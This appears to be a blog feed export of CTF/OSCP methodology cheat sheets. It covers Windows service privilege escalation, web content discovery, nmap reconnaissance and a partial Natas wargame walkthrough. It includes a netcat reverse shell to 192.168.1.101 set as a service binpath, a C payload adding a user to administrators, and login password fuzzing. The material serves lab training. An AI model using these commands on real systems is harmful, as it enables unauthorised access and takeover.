class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> config upnphost binpath= <span class="string">&quot;C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe&quot;</span></span><br><span class="line"><span class="built_in">sc</span> config upnphost obj= <span class="string">&quot;.\LocalSystem&quot;</span> password= <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">sc</span> config upnphost depend= <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><h4 id="Weak-service-permissions"><a href="#Weak-service-permissions" class="headerlink" title="Weak service permissions"></a>Weak service permissions</h4><blockquote><p>Services on windows are programs that run in the background. Without a GUI.<br>If you find a service that has write permissions set to <code>everyone</code> you can change that binary into your custom binary and make it execute in the privileged context.<br>First we need to find services. That can be done using <code>wmci</code> or <code>sc.exe</code>. Wmci is not available on all windows machines, and it might not be available to your user. If you don’t have access to it, you can use <code>sc.exe</code>.</p></blockquote><ul><li>WMCI<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><blockquote><p>This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the <code>icacls</code> program. Notice that <code>icacls</code> is only available from Vista and up. XP and lower has <code>cacls</code> instead.<br>As you can see in the command below you need to make sure that you have access to <code>wimc</code>, <code>icacls</code> and write privilege in <code>C:\windows\temp</code>.</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f <span class="string">&quot;tokens=2 delims=&#x27;=&#x27;&quot;</span> %a <span class="keyword">in</span> (<span class="string">&#x27;wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;&#x27;</span>) <span class="keyword">do</span> @<span class="built_in">echo</span> %a &gt;&gt; c:\windows\temp\permissions.txt</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f eol^=^<span class="string">&quot;^ delims^=^&quot;</span> %a <span class="keyword">in</span> (c:\windows\temp\permissions.txt) <span class="keyword">do</span> cmd.exe /c icacls <span class="string">&quot;%a&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>Binaries in system32 are excluded since they are mostly correct, since they are installed by windows.</p></blockquote></li></ul><p>sc.exe</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> query state= all | findstr <span class="string">&quot;SERVICE_NAME:&quot;</span> &gt;&gt; Servicenames.txt</span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %i <span class="keyword">in</span> (Servicenames.txt) <span class="keyword">DO</span> <span class="built_in">echo</span> %i</span><br><span class="line"><span class="built_in">type</span> Servicenames.txt</span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F <span class="string">&quot;tokens=2 delims= &quot;</span> %i <span class="keyword">in</span> (Servicenames.txt) <span class="keyword">DO</span> @<span class="built_in">echo</span> %i &gt;&gt; services.txt</span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %i <span class="keyword">in</span> (services.txt) <span class="keyword">DO</span> @<span class="built_in">sc</span> qc %i | findstr <span class="string">&quot;BINARY_PATH_NAME&quot;</span> &gt;&gt; path.txt</span><br></pre></td></tr></table></figure><blockquote><p>Now you can process them one by one with the cacls command.</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cacls <span class="string">&quot;C:\path\to\file.exe&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\Users:(F). Or where your user/usergroup has (F) or (C) rights.</p></blockquote><blockquote><p>Example:</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\path\to\file.exe </span><br><span class="line">BUILTIN\Users:F</span><br><span class="line">BUILTIN\Power Users:C </span><br><span class="line">BUILTIN\Administrators:F </span><br><span class="line">NT AUTHORITY\SYSTEM:F</span><br></pre></td></tr></table></figure><blockquote><p>That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom.<br>Here is a POC code for getsuid.</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">    i = system(<span class="string">&quot;net localgroup administrators theusername /add&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>We then compile it with mingw like this:</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i686<span class="literal">-w64</span><span class="literal">-mingw32</span><span class="literal">-gcc</span> windows<span class="literal">-exp</span>.c <span class="literal">-lws2_32</span> <span class="literal">-o</span> exp.exe</span><br></pre></td></tr></table></figure><blockquote><p>We can restart the service now </p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic service NAMEOFSERVICE call startservice</span><br><span class="line">net stop [<span class="type">service</span> <span class="type">name</span>] &amp;&amp; net <span class="built_in">start</span> [<span class="type">service</span> <span class="type">name</span>].</span><br></pre></td></tr></table></figure><blockquote><p>The binary should now be executed in the SYSTEM or Administrator context.</p></blockquote><h4 id="MIgrate-the-meterpreter-shell"><a href="#MIgrate-the-meterpreter-shell" class="headerlink" title="MIgrate the meterpreter shell"></a>MIgrate the meterpreter shell</h4><blockquote><p>If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this:</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic <span class="keyword">process</span> list brief | find <span class="string">&quot;winlogon&quot;</span></span><br></pre></td></tr></table></figure><p>So when you get the shell you can either type migrate PID or automate this so that meterpreter automatically migrates. <a href="http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html">Here</a> for more information</p><h4 id="Find-and-exploit-unquoted-service-paths"><a href="#Find-and-exploit-unquoted-service-paths" class="headerlink" title="Find and exploit unquoted service paths"></a>Find and exploit unquoted service paths</h4><p>If the path contains a space and is not quoted, the service is vulnerable.</p><ul><li>Find services with Unquoted paths</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Using WMIC</span></span><br><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i <span class="string">&quot;auto&quot;</span> |findstr /i /v <span class="string">&quot;c:\windows\\&quot;</span> |findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Using sc</span></span><br><span class="line"><span class="string">sc query</span></span><br><span class="line"><span class="string">sc qc service name</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Look for Binary_path_name and see if it is unquoted.</span></span><br></pre></td></tr></table></figure><ul><li>exploit it</li></ul><p>If the path to the binary is:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Program Files\something\winamp.exe</span><br></pre></td></tr></table></figure><p>We can place a binary like this</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\program.exe</span><br></pre></td></tr></table></figure><p>When the program is restarted it will execute the binary <code>program.exe</code>, which we of course control. We can do this in any directory that has a space in its name. Not only <code>program files</code>.</p><ul><li>There is also a metasploit module for this is: <code>exploit/windows/local/trusted_service_path</code></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> TOOLING </tag>
            
            <tag> METHODOLOGY </tag>
            
            <tag> OSCP </tag>
            
            <tag> EXPLOIT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Methodology - Content Discovery</title>
      <link href="2020/12/20/Content%20Discovery/"/>
      <url>2020/12/20/Content%20Discovery/</url>
      
        <content type="html"><![CDATA[<p>For discovering as much information about the web server once found, we need to bruteforce URLs, DNS subdomains and virtual hosts.</p><a id="more"></a><h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><blockquote><p>Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.</p></blockquote><h4 id="Scan-a-host"><a href="#Scan-a-host" class="headerlink" title="Scan a host"></a>Scan a host</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h <span class="variable">$RHOST</span></span><br></pre></td></tr></table></figure><h4 id="Scan-specefic-ports"><a href="#Scan-specefic-ports" class="headerlink" title="Scan specefic ports"></a>Scan specefic ports</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h <span class="variable">$RHOST</span> -port <span class="variable">$PORT1</span>, <span class="variable">$PORT2</span></span><br></pre></td></tr></table></figure><h3 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a>Gobuster</h3><blockquote><p>Gobuster is a tool used to brute-force :- URIs (directories and files) in web sites, DNS subdomains (with wildcard support), Virtual Host names on target web servers, Open Amazon S3 buckets</p></blockquote><h4 id="Find-directories-and-files-Check-what-framework-application-is-using-and-set-values-for-x-flag-accordingly"><a href="#Find-directories-and-files-Check-what-framework-application-is-using-and-set-values-for-x-flag-accordingly" class="headerlink" title="Find directories and files . Check what framework application is using and set values for -x flag accordingly"></a>Find directories and files . Check what framework application is using and set values for <code>-x</code> flag accordingly</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u <span class="variable">$RHOST</span> -w <span class="variable">$WORDLIST</span> -t 50 -x &lt;file_extensions&gt;</span><br></pre></td></tr></table></figure><h4 id="Vhost-Mode-Finds-out-if-the-subdomain-exists-by-visiting-url-and-verifying-IP-address"><a href="#Vhost-Mode-Finds-out-if-the-subdomain-exists-by-visiting-url-and-verifying-IP-address" class="headerlink" title="Vhost Mode (Finds out if the subdomain exists by visiting url and verifying IP address)"></a>Vhost Mode (Finds out if the subdomain exists by visiting url and verifying IP address)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -v -w <span class="variable">$WORDLIST</span> -u <span class="variable">$RHOST</span> -o <span class="variable">$OUTPUTFILE</span></span><br></pre></td></tr></table></figure><h4 id="Find-subdomains-on-a-specific-domain"><a href="#Find-subdomains-on-a-specific-domain" class="headerlink" title="Find subdomains on a specific domain"></a>Find subdomains on a specific domain</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dns -d <span class="variable">$DOMAIN</span> -w <span class="variable">$WORDLIST</span> -i</span><br></pre></td></tr></table></figure><ul><li>use <code>-k</code> to skip SSL verification</li></ul><h4 id="Gobuster-Thread-Switch"><a href="#Gobuster-Thread-Switch" class="headerlink" title="Gobuster Thread Switch"></a>Gobuster Thread Switch</h4><p>The Gobuster thread switch specifies the number of concurrent threads that will run at the same time .</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster -r <span class="variable">$NUMBER</span></span><br></pre></td></tr></table></figure><h4 id="Verbose"><a href="#Verbose" class="headerlink" title="Verbose"></a>Verbose</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster -v</span><br></pre></td></tr></table></figure><h4 id="Change-user-agent-for-requests"><a href="#Change-user-agent-for-requests" class="headerlink" title="Change user agent for requests"></a>Change user agent for requests</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster -a <span class="variable">$ANYUSERAGENT</span></span><br></pre></td></tr></table></figure><h4 id="Gobuster-export-results-to-txt"><a href="#Gobuster-export-results-to-txt" class="headerlink" title="Gobuster export results to txt"></a>Gobuster export results to txt</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster -o <span class="variable">$FILENAME</span></span><br></pre></td></tr></table></figure><h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><blockquote><p>A fast web fuzzer written in Go.</p></blockquote><h4 id="Directory-discovery"><a href="#Directory-discovery" class="headerlink" title="Directory discovery"></a>Directory discovery</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w <span class="variable">$WORDLIST</span> -u https://target/FUZZ</span><br></pre></td></tr></table></figure><h4 id="Virtual-host-discovery"><a href="#Virtual-host-discovery" class="headerlink" title="Virtual host discovery"></a>Virtual host discovery</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w <span class="variable">$WORDLIST</span> -u https://target -H <span class="string">&quot;Host: FUZZ&quot;</span> -fs 4242</span><br></pre></td></tr></table></figure><ul><li>Assuming respinse size is 4242 bytes</li></ul><h4 id="GET-parameter-fuzzing"><a href="#GET-parameter-fuzzing" class="headerlink" title="GET parameter fuzzing"></a>GET parameter fuzzing</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w <span class="variable">$PARAMLIST</span> -u https://<span class="variable">$RHOST</span>/script.php?FUZZ=test_value -fs 4242</span><br></pre></td></tr></table></figure><p>if the parameter name is known:-</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w <span class="variable">$VALUESLIST</span> -u https://<span class="variable">$RHOST</span>/script.php?valid_name=FUZZ -<span class="built_in">fc</span> 401</span><br></pre></td></tr></table></figure><ul><li>Assuming 401 is return status code for wrong parameter</li></ul><h4 id="POST-data-fuzzing"><a href="#POST-data-fuzzing" class="headerlink" title="POST data fuzzing"></a>POST data fuzzing</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w <span class="variable">$POSTDATA</span> -X POST -d <span class="string">&quot;username=admin\&amp;password=FUZZ&quot;</span> -u https://<span class="variable">$RHOST</span>/login.php -<span class="built_in">fc</span> 401</span><br></pre></td></tr></table></figure><p>Again filtering out 401 response code .</p><h4 id="Maximum-execution-time"><a href="#Maximum-execution-time" class="headerlink" title="Maximum execution time"></a>Maximum execution time</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w <span class="variable">$WORDLIST</span> -u https://<span class="variable">$RHOST</span>/FUZZ -maxtime 60</span><br></pre></td></tr></table></figure><ul><li>Meaning it wont run forever but stop at 60 seconds</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> RECONNAISANCE </tag>
            
            <tag> TOOLING </tag>
            
            <tag> METHODOLOGY </tag>
            
            <tag> OSCP </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF Methodology - Network Reconnaisance</title>
      <link href="2020/12/20/Network%20Reconnaisance/"/>
      <url>2020/12/20/Network%20Reconnaisance/</url>
      
        <content type="html"><![CDATA[<p>The motivation behind <code>CTF Methodology - Network Reconnaisance</code> post is to keep a cheat sheet of all scanning methods that come in handy while starting the Reconnaisance phase for a CTF or a lab box . Will try to keep this list updated as new boxes teach new scanning methods .</p><a id="more"></a><h2 id="Network-scanning"><a href="#Network-scanning" class="headerlink" title="Network scanning"></a>Network scanning</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><h4 id="Full-TCP-Nmap"><a href="#Full-TCP-Nmap" class="headerlink" title="Full TCP Nmap"></a>Full TCP Nmap</h4><p>Enumerate through all the ports and services for identifying easy to find vulnerabilities and get a full picture of applications/services running on the host in question </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -p- -o nmap.out -vvv <span class="variable">$RHOST</span></span><br></pre></td></tr></table></figure><ul><li><em>-sV</em> Probe open ports to determine service/version info</li><li><em>-sC</em> equivalent to <code>--script=default</code>.  <code>--script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt;</code> is a comma separated list of directories, script-files or script-categories</li><li><em>-p-</em> means it has to scan for all ports from 0 to 65535</li><li><em>-A</em> means </li><li><em>-T4</em> is a time template where <em>T0</em> is very slow and <em>T5</em> very fast</li><li><em>-vvv</em> means very very very verbose</li></ul><h4 id="Full-UDP-Nmap"><a href="#Full-UDP-Nmap" class="headerlink" title="Full UDP Nmap"></a>Full UDP Nmap</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --top-ports 20 -o nmap-udp.out -vvv <span class="variable">$RHOST</span></span><br></pre></td></tr></table></figure><h4 id="Stealthy"><a href="#Stealthy" class="headerlink" title="Stealthy"></a>Stealthy</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS <span class="variable">$RHOST</span></span><br></pre></td></tr></table></figure><h4 id="Fast-Scan"><a href="#Fast-Scan" class="headerlink" title="Fast Scan"></a>Fast Scan</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="variable">$RHOST</span> -F</span><br></pre></td></tr></table></figure><h4 id="Only-scan-top-100"><a href="#Only-scan-top-100" class="headerlink" title="Only scan top 100"></a>Only scan top 100</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="variable">$RHOST</span> --top-ports 100</span><br></pre></td></tr></table></figure><h4 id="When-no-initial-results"><a href="#When-no-initial-results" class="headerlink" title="When no initial results"></a>When no initial results</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -n -vvv -p1-500 -o nmap-partial.out <span class="variable">$RHOST</span></span><br></pre></td></tr></table></figure><h4 id="Scan-Targeted-Ports"><a href="#Scan-Targeted-Ports" class="headerlink" title="Scan Targeted Ports"></a>Scan Targeted Ports</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -n -vvv -p22,80 -oN nmap-targeted.out <span class="variable">$RHOST</span></span><br></pre></td></tr></table></figure><h4 id="Automated-nmap-scanning"><a href="#Automated-nmap-scanning" class="headerlink" title="Automated nmap scanning"></a>Automated nmap scanning</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmapAutomator ip All</span><br></pre></td></tr></table></figure><h4 id="Check-if-ftp-allows-anonymous-login"><a href="#Check-if-ftp-allows-anonymous-login" class="headerlink" title="Check if ftp allows anonymous login"></a>Check if ftp allows anonymous login</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -n -vvv -p21 -sC -sV <span class="variable">$RHOST</span></span><br></pre></td></tr></table></figure><h4 id="Scan-for-alive-hosts-in-a-CIDR-range"><a href="#Scan-for-alive-hosts-in-a-CIDR-range" class="headerlink" title="Scan for alive hosts in a CIDR range"></a>Scan for alive hosts in a CIDR range</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -vvv <span class="variable">$RHOST</span>/24</span><br></pre></td></tr></table></figure><h4 id="Scan-for-alive-hosts-in-a-CIDR-range-faster-and-sort-machines-that-are-up-filter-the-IPs-and-create-a-file"><a href="#Scan-for-alive-hosts-in-a-CIDR-range-faster-and-sort-machines-that-are-up-filter-the-IPs-and-create-a-file" class="headerlink" title="Scan for alive hosts in a CIDR range faster and sort machines that are up, filter the IPs and create a file"></a>Scan for alive hosts in a CIDR range faster and sort machines that are up, filter the IPs and create a file</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -n -vvv <span class="variable">$RHOST</span>/24 &gt; ip-range.txt</span><br><span class="line">cat ip-range.txt | grep -B 1 <span class="string">&quot;Host is up&quot;</span></span><br><span class="line">grep -o <span class="string">&#x27;[0-9]\&#123;1,3\&#125;\.[0-9]\&#123;1,3\&#125;\.[0-9]\&#123;1,3\&#125;\.[0-9]\&#123;1,3\&#125;&#x27;</span> ip-range.txt &gt; only-ip.txt</span><br></pre></td></tr></table></figure><h4 id="Scan-for-specefic-IP-range"><a href="#Scan-for-specefic-IP-range" class="headerlink" title="Scan for specefic IP range"></a>Scan for specefic IP range</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="variable">$RHOST</span>-100</span><br></pre></td></tr></table></figure><h4 id="Knock-that-port"><a href="#Knock-that-port" class="headerlink" title="Knock that port"></a>Knock that port</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> 7000 8000 9000; <span class="keyword">do</span> nmap -Pn --host_timeout 201 --max-retries 0 -p <span class="variable">$x</span> <span class="variable">$RHOST</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><h4 id="Find-unused-IP-addresses-and-store-in-a-text-file"><a href="#Find-unused-IP-addresses-and-store-in-a-text-file" class="headerlink" title="Find unused IP addresses and store in a text file"></a>Find unused IP addresses and store in a text file</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sn <span class="variable">$RHOST</span>/24 | grep down | awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span> &gt; filename.txt</span><br></pre></td></tr></table></figure><h4 id="Dont-Ping"><a href="#Dont-Ping" class="headerlink" title="Dont Ping"></a>Dont Ping</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PN -vvv <span class="variable">$RHOST</span></span><br></pre></td></tr></table></figure><h4 id="Grab-Banner"><a href="#Grab-Banner" class="headerlink" title="Grab Banner"></a>Grab Banner</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet ip port</span><br><span class="line">nc -nv ip port</span><br><span class="line">curl -iv <span class="variable">$RHOST</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> RECONNAISANCE </tag>
            
            <tag> TOOLING </tag>
            
            <tag> METHODOLOGY </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Natas 0 - 14</title>
      <link href="2020/12/19/Natas1/"/>
      <url>2020/12/19/Natas1/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/natas1.png" alt="natas"></p><p>Natas is a web based wargame at <a href="https://overthewire.org/wargames/natas/">over the wire</a> (OTW). Have tried to use both python and burp method wherever applicable while solving the levels .</p><a id="more"></a><blockquote><p>Each level of natas consists of its own website located at <a href="http://natasx.natas.labs.overthewire.org/">http://natasX.natas.labs.overthewire.org</a>, where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.<br>Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in <code>/etc/natas_webpass/</code>. E.g. the password for natas5 is stored in the file <code>/etc/natas_webpass/natas5</code> and only readable by natas4 and natas5.</p></blockquote><h3 id="Natas-Level-0-→-Level-1"><a href="#Natas-Level-0-→-Level-1" class="headerlink" title="Natas Level 0 → Level 1"></a>Natas Level 0 → Level 1</h3><p>Username: natas1<br>URL: <a href="http://natas1.natas.labs.overthewire.org/">http://natas1.natas.labs.overthewire.org</a></p><p>Checked the source of the page by doing right click, got the password for next level<br>Elementary<br><img src="/images/natas2.png" alt="natas2"></p><h3 id="Natas-Level-1-→-Level-2"><a href="#Natas-Level-1-→-Level-2" class="headerlink" title="Natas Level 1 → Level 2"></a>Natas Level 1 → Level 2</h3><p>Username: natas2<br>URL: <a href="http://natas2.natas.labs.overthewire.org/">http://natas2.natas.labs.overthewire.org</a><br>Upon some minor enumerating we get a folder called files on the server<br>Go to the files dir<br><img src="/images/natas3.png" alt="natas3"><br>got the next password in users.txt</p><h3 id="Natas-Level-2-→-Level-3"><a href="#Natas-Level-2-→-Level-3" class="headerlink" title="Natas Level 2 → Level 3"></a>Natas Level 2 → Level 3</h3><p>Username: natas3<br>URL: <a href="http://natas3.natas.labs.overthewire.org/">http://natas3.natas.labs.overthewire.org</a><br>Robots.txt has this entry</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;s3cr3t&#x2F;</span><br></pre></td></tr></table></figure><p>Dir is disallowed from google scraper so there must be something interesting in it<br>Ha got users.txt in it</p><h3 id="Natas-Level-3-→-Level-4"><a href="#Natas-Level-3-→-Level-4" class="headerlink" title="Natas Level 3 → Level 4"></a>Natas Level 3 → Level 4</h3><p>Username: natas4<br>URL: <a href="http://natas4.natas.labs.overthewire.org/">http://natas4.natas.labs.overthewire.org</a><br>Can only view this page when the referer is natas5’s host<br>Capture the traffic by burp proxy<br>Change the value in referer and forward to the browser<br><img src="/images/natas4.png" alt="natas4"><br>Same thing can be done using requests library for python<br>Create a session with requests library and change the refer there<br><img src="/images/natas5.png" alt="natas5"></p><h3 id="Natas-Level-4-→-Level-5"><a href="#Natas-Level-4-→-Level-5" class="headerlink" title="Natas Level 4 → Level 5"></a>Natas Level 4 → Level 5</h3><p>Username: natas5<br>URL: <a href="http://natas5.natas.labs.overthewire.org/">http://natas5.natas.labs.overthewire.org</a><br>The screen says not logged in even after giving password<br>On capturing the packet in burp suite we see a cookie with loggedin=0<br>Set the value to 1 and forward the request to browser got the pass for 6</p><p>Similarly we can use requests library for python and change the cookie<br><img src="/images/natas6.png" alt="natas6"></p><h3 id="Natas-Level-5-→-Level-6"><a href="#Natas-Level-5-→-Level-6" class="headerlink" title="Natas Level 5 → Level 6"></a>Natas Level 5 → Level 6</h3><p>Username: natas6<br>URL: <a href="http://natas6.natas.labs.overthewire.org/">http://natas6.natas.labs.overthewire.org</a><br><img src="/images/natas7.png" alt="natas7"><br>Inspected the page code , the script checking the password was importing a page secret.inf<br>Checked the page got the secret</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$secret &#x3D; &quot;FOEIUWGHFEEUHOFUOIU&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">Access granted. The password for natas7 is xxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>For doing this with python I will have to create a session in my script then pass the post request with the secret .<br>To test this theory I can first initiate connection through the script then do a post request<br><img src="/images/natas8.png" alt="natas8"><br>here I am just creating a session and printing what I am getting on my screen. So on the response I get the html page that has the submit query button in it.<br><img src="/images/natas9.png" alt="natas9"><br>it will also print headers<br><img src="/images/natas10.png" alt="natas10"><br>Now I will add a post request to my script which will send the secret thus triggering this query .<br><img src="/images/natas11.png" alt="natas11"><br>This sends the secret with correct headers , post request to the url . We get the password<br><img src="/images/natas12.png" alt="natas12"></p><h3 id="Natas-Level-6-→-Level-7"><a href="#Natas-Level-6-→-Level-7" class="headerlink" title="Natas Level 6 → Level 7"></a>Natas Level 6 → Level 7</h3><p>Username: natas7<br>URL: <a 